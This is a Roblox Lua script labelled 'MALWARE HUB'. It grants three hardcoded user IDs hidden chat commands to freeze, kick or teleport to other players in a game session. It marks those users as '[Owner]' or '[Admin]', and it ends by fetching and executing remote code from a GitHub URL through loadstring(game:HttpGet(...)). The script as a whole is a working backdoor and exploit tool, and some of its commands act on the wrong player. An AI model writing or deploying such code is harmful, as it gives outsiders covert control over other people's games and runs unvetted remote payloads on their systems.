local PremUser = {
    3861815968, -- iiTheCaliXx
    3743834922, -- LaBeastHk
    2549855342, -- svoirr
}

local Players = game.Players
local ReplicatedStorage = game:GetService('ReplicatedStorage')

local function executeCommand(command, targetName, executor)
    local targetPlayer = Players:FindFirstChild(targetName) or executor
    if not targetPlayer then return end

    if command == 'm!freeze' then
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPlayer.Character.HumanoidRootPart.Anchored = true
        end
    elseif command == 'm!unfreeze' or command == 'm!nofreeze' then
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPlayer.Character.HumanoidRootPart.Anchored = false
        end
    elseif command == 'm!kick' then
        targetPlayer:Kick("\n[MALWARE HUB]\nKicked by: " .. executor.Name .. "\n[If you think the command was misused, you can report it to the Discord server.]")
    elseif command == 'm!bring' then
        if executor.Character and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            executor.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        end
    elseif command == 'm!fling' then
        if executor.Character and executor.Character:FindFirstChild("HumanoidRootPart") then
            executor.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
        end
    elseif command == 'm!kill' then
        local humanoid = executor.Character and executor.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:Destroy()
        end
    elseif command == 'm!sit' then
        local humanoid = executor.Character and executor.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Sit = true
        end
    elseif command == 'm!bug' then
        if executor.Character then
            executor.Character:Destroy()
        end
    elseif command == 'm!checkuser' then
        local args = {[1] = "/w " .. executor.Name .. " I'm using MalwareHub", [2] = "All"}
        ReplicatedStorage:WaitForChild('DefaultChatSystemChatEvents').SayMessageRequest:FireServer(unpack(args))
    end
end

local function onPlayerChatted(player, message)
    if not table.find(PremUser, player.UserId) then return end

    local msg = string.lower(message)
    local SplitCMD = string.split(msg, ' ')
    local command = SplitCMD[1]
    local targetName = SplitCMD[2] or player.Name -- Default to self if no target is specified

    executeCommand(command, targetName, player)
end

-- Connect chat handler for each player
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)

    -- Handle display names for admins
    local PREMS = table.find(PremUser, player.UserId)
    if PREMS then
        player.CharacterAdded:Connect(function()
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.DisplayName = (table.find(PremUser, player.UserId) and "[Owner] " or "[Admin] ") .. humanoid.DisplayName
            end
        end)
    end
end)

-- Initialize display names for already connected players
for _, v in pairs(Players:GetChildren()) do
    if v:IsA("Player") then
        local PREMS = table.find(PremUser, v.UserId)
        if PREMS then
            wait(5)
            local humanoid = v.Character and v.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.DisplayName = (table.find(PremUser, v.UserId) and "[Owner] " or "[Admin] ") .. humanoid.DisplayName
            end
        end
    end
end

-- Load and execute external script
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
